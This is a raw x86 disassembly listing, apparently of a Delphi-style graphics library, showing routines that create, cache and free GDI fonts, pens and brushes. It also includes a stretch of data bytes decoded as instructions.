add [ edx + ebx * 4 + 0x42 ] dh
add [ esi + edx * 2 ] ah
inc edx
add [ esi + edx * 2 - 0x62e7ffbe ] ch
inc edx
add [ eax - 0x47ffbd62 ] dl
sahf
inc edx
add ah cl
sahf
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
test al 0x21
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
cmp [ ecx ] ah
inc edx
add ah cl
sbb eax [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
fsub [ eax ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
and [ edx ] al
sbb [ eax ] al
add [ eax ] al
test al 0x1d
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
sub al 0x9a
inc edx
add [ edx + ebx * 4 + 0x42 ] bl
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
cmp [ ecx ] ah
inc edx
add [ eax ] al
add [ eax ] al
or [ ebx ] bl
inc edx
add [ esp + esi - 0x567fffc0 ] dl
inc ecx
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42 ] ah
add [ eax + eax ] bh
imul esp [ ebx + 0x73 ] 0x1f940000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
sbb eax 0x19f00042
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
push ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] bl
inc edx
add [ eax + eax ] ah
add [ eax ] al
test al 0x1d
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
and [ ecx + 0x42 ] 0x0
mov esp 0xe004261
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
hlt
inc eax
jne r-xdata
retn
cmp eax [ rw-data ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4221d8
and al 0x22
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc edx
add [ eax + eax ] ah
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov [ edx ] ah
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
inc eax
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_42224c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_422288
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4222c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_422238
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4222ac
xor edx edx
push ebp
push sub_422398
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42239f
mov eax [ ebp - 0x4 ]
call sub_4222b8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4027b4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4029b0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_40800c
test al al
je r-xdata
sub_4223a8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4222ac
xor ecx ecx
push ebp
push sub_42242f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4222b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422458
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4222ac
xor eax eax
push ebp
push sub_4224c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4222c4
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4223a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4224c8
mov eax [ ebp - 0x4 ]
call sub_4222b8
retn
mov eax ebx
mov si 0xfffd
call sub_403448
sub_4224d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4222ac
xor eax eax
push ebp
push sub_42252c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422533
mov eax [ ebp - 0x4 ]
call sub_4222b8
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403448
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4223a8
sub_42253c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4222ac
xor edx edx
push ebp
push sub_42259b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225a2
mov eax [ ebp - 0x4 ]
call sub_4222b8
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_4225a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a5a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422645
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a238
mov ebx eax
mov eax ebx
call sub_423b74
inc [ ebp - 0x4 ]
mov eax ebx
call sub_423e88
mov eax [ rw-data ]
call sub_42253c
mov eax [ rw-data ]
call sub_42253c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42264c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41a238
call sub_423d60
inc esi
dec ebx
jne r-xdata
sub_422c9b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_419ce8
retn
sub_422ccc
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d58
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b48
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_422d80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4222c4
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_422dd4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4223a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_422e16
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a7dc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422ad8
xor eax eax
push ebp
push sub_422ed3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_422ad8
xor eax eax
push ebp
push sub_422eb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4224d0
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_422f54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ebd
mov eax [ ebp - 0x8 ]
call sub_422ae8
retn
mov eax ebx
call sub_4231d8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4231f4
sub_422f04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422ad8
xor eax eax
push ebp
push sub_422f49
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f50
mov eax [ ebp - 0x4 ]
call sub_422ae8
retn
sub_422f68
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4230f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230f8
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403fc0
retn
mov eax [ rw-data ]
call sub_4222ac
xor eax eax
push ebp
push sub_4230c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4222b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404200
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40899c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404200
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_40899c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404200
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_408144
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_42324c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423110
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_422ccc
mov edx esp
mov eax ebx
call sub_422f04
add esp 0x2c
pop esi
pop ebx
retn
sub_42313c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_422eec
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_422f04
add esp 0x2c
pop esi
pop ebx
retn
sub_42317c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_422eec
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c58
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404238
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b48
mov edx esp
mov eax ebx
call sub_422f04
sub_4231f4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_42313c
pop esi
pop ebx
retn
sub_423220
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_422eec
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_422f04
add esp 0x30
pop ebx
retn
sub_423254
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_422eec
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_422f04
add esp 0x2c
pop esi
pop ebx
retn
sub_423284
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_422eec
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_422f04
add esp 0x2c
pop esi
pop ebx
retn
sub_4232ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4222c4
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4232f0
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4223a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_423316
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a7dc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422ad8
xor eax eax
push ebp
push sub_4233b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_422ad8
xor eax eax
push ebp
push sub_42339a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4224d0
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233a1
mov eax [ ebp - 0x8 ]
call sub_422ae8
retn
sub_4233d0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4233e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422ad8
xor eax eax
push ebp
push sub_42342d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423434
mov eax [ ebp - 0x4 ]
call sub_422ae8
retn
sub_423440
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4233d0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4233e8
add esp 0x10
pop esi
pop ebx
retn
sub_423468
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4222ac
xor eax eax
push ebp
push sub_4234ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4222b8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_422a94
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_42351c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4233d0
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_4233e8
add esp 0x10
pop esi
pop ebx
retn
sub_42354c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4233d0
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_4233e8
sub_423578
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4222c4
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4235b8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4223a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4235de
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a7dc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_422ad8
xor eax eax
push ebp
push sub_423670
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_422ad8
xor eax eax
push ebp
push sub_423653
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4224d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42365a
mov eax [ ebp - 0x8 ]
call sub_422ae8
retn
sub_423688
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_4236a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422ad8
xor eax eax
push ebp
push sub_4236e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236f0
mov eax [ ebp - 0x4 ]
call sub_422ae8
retn
sub_4236f4
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_4236a4
add esp 0x10
pop edi
pop esi
retn
sub_423720
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423688
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_4236a4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_423754
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4222ac
xor edx edx
push ebp
push sub_423821
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4222b8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
